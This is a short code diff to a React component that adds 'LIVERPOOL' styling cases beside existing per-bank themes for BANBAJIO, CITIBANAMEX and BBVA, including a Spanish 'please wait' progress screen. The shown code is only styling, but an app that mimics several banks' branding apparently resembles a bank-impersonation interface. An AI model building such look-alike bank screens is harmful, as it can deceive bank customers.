@@ -477,6 +477,7 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
             <p className="text-sm text-gray-500 mb-4">Esto puede tomar un momento. Por favor espere...</p>
             <div className="h-4 w-full bg-gray-200 rounded overflow-hidden">
               <div className={`h-full ${
+                banco === 'LIVERPOOL' ? 'liverpool-bg' :
                 banco === 'BANBAJIO' ? 'banbajio-bg' : 
                 banco === 'CITIBANAMEX' ? 'bg-[#0070BA]' : 
                 banco === 'BBVA' ? 'bg-[#072146]' :
@@ -508,6 +509,8 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
   // Definimos las clases de estilos para los botones según el banco
   const getPrimaryBtnClass = () => {
     switch(banco) {
+      case 'LIVERPOOL':
+        return 'bg-[#E1147B] text-white py-2 px-6 rounded hover:bg-opacity-90 transition-colors';
       case 'CITIBANAMEX':
         return 'bg-[#0070BA] text-white py-2 px-6 rounded hover:bg-opacity-90 transition-colors';
       case 'BANBAJIO':
@@ -540,6 +543,7 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
   // Función para obtener la clase de header según el banco
   const getBankHeaderClass = () => {
     switch(banco) {
+      case 'LIVERPOOL': return 'liverpool-header';
       case 'BANBAJIO': return 'banbajio-header';
       case 'CITIBANAMEX': return 'citibanamex-header';
       case 'BBVA': return 'bbva-header';
@@ -557,6 +561,7 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
   // Función para obtener la clase del contenedor según el banco
   const getBankContainerClass = () => {
     switch(banco) {
+      case 'LIVERPOOL': return 'bg-white p-4 rounded-lg shadow liverpool-container';
       case 'BANBAJIO': return 'bg-white p-4 rounded-lg shadow';
       case 'CITIBANAMEX': return 'citibanamex-container';
       case 'BBVA': return 'bbva-container';
